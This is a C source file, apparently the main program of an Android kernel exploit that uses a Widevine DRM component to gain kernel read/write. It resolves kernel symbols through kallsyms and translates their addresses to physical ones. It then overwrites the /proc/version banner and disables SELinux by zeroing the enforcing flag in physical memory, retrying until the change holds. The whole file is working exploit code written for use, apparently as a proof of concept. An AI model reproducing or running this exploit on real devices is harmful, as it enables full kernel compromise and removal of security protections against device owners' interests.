#include <stdio.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <unistd.h>

#include "defs.h"
#include "types.h"
#include "widevine.h"
#include "exploit.h"
#include "kallsyms.h"

#define SELINUX_STATE_ENFORCING_OFF (1)

static uint64_t g_kernel_virt_base;

// Not a very original function name but ¯\_(ツ)_/¯
static inline physaddr_t virt_to_phys(uint64_t virt_addr)
{
    return (virt_addr - g_kernel_virt_base) + KERNEL_PHYS_BASE;
}

static int disable_selinux(void)
{
    // Should be a parameter in a selinux_state struct
    uint64_t selinux_enforcing_virt =
        kallsyms_lookup_name("selinux_state");
    if (0 == selinux_enforcing_virt) {
        // Could also be saved in a selinux_enforcing variable
        selinux_enforcing_virt = kallsyms_lookup_name("selinux_enforcing");
        if (0 == selinux_enforcing_virt) {
            return 0;
        }
    } else {
        selinux_enforcing_virt += SELINUX_STATE_ENFORCING_OFF;
    }
    physaddr_t selinux_enforcing_phys = virt_to_phys(selinux_enforcing_virt);

    // On some very rare occasions, modifying selinux_enforcing doesn't stick
    // (i.e. doesn't stay disabled), so let's make sure it does by trying
    // multiple times. I guess it has to do with caching.
    for (size_t i = 0; ; i++) {
        uint8_t selinux_enforcing_buf[WIDEVINE_LEN_ALIGN] = {0};
        if (0 == exploit_phys_read(selinux_enforcing_buf,
                                   selinux_enforcing_phys,
                                   sizeof(selinux_enforcing_buf))) {
            return 0;
        }

        uint8_t *selinux_enforcing = (uint8_t *)selinux_enforcing_buf;
        if (0 == *selinux_enforcing) {
            if (0 == i) {
                fprintf(stderr, "[+] SELinux was already disabled\n");
            } else if (1 == i) {
                fprintf(stderr, "[+] Disabled SELinux\n");
            } else {
                fprintf(stderr, "[+] Disabled SELinux after %zu attempts\n",
                        i);
            }
            return 1;
        } else if (10 == i) {
            fprintf(stderr,
                    "[-] Failed to disable SELinux after 10 attempts\n");
            return 0;
        }

        *selinux_enforcing = 0;
        if (0 == exploit_phys_write(selinux_enforcing_phys,
                                    selinux_enforcing_buf,
                                    sizeof(selinux_enforcing_buf))) {
            return 0;
        }

        // Give it some time before we check whether selinux_enforcing was
        // actually modified or not
        sleep(1);
    }
}

int main(void)
{
    int result = 1;

    if (0 == widevine_setup()) {
        fprintf(stderr, "[-] Failed to setup widevine\n");
        goto cleanup;
    }
    fprintf(stderr, "[+] Setup widevine\n");

    if (0 == exploit_setup()) {
        fprintf(stderr, "[-] Exploit setup failed\n");
        goto cleanup;
    }
    fprintf(stderr, "[+] Setup exploit kernel r/w\n");

    if (0 == kallsyms_find()) {
        fprintf(stderr, "[-] Failed to find kallsyms\n");
        goto cleanup;
    }
    fprintf(stderr, "[+] Found all kallsyms data\n");

    // Get the kernel virtual base address to be able to calculate the physical
    // adresses of virtual addresses
    g_kernel_virt_base = kallsyms_lookup_name("_head");
    if (0 == g_kernel_virt_base) {
        goto cleanup;
    }
    fprintf(stderr, "[+] Kernel virtual base address: 0x%16" PRIx64 "\n",
            g_kernel_virt_base);

    // At this point we have full control of the kernel, we can modify the data
    // behind every symbol as we wish

    // For example, we can modify /proc/version by modifying linux_proc_banner
    uint64_t linux_proc_banner_virt =
        kallsyms_lookup_name("linux_proc_banner");
    if (0 == linux_proc_banner_virt) {
        goto cleanup;
    }
    // This has to be aligned to WIDEVINE_LEN_ALIGN
    char new_proc_version[WIDEVINE_LEN_ALIGN] = {0};
    strcpy(new_proc_version, "*modified*\n");
    if (0 == exploit_phys_write(virt_to_phys(linux_proc_banner_virt),
                               new_proc_version, sizeof(new_proc_version))) {
        fprintf(stderr, "[-] Failed to modify /proc/version\n");
        goto cleanup;
    }
    fprintf(stderr, "[+] Modified /proc/version\n");

    // And to demonstrate something more serious, we can disable SELinux
    if (0 != disable_selinux()) {
        result = 0;
    }

cleanup:
    fflush(stderr);
    return result;
}
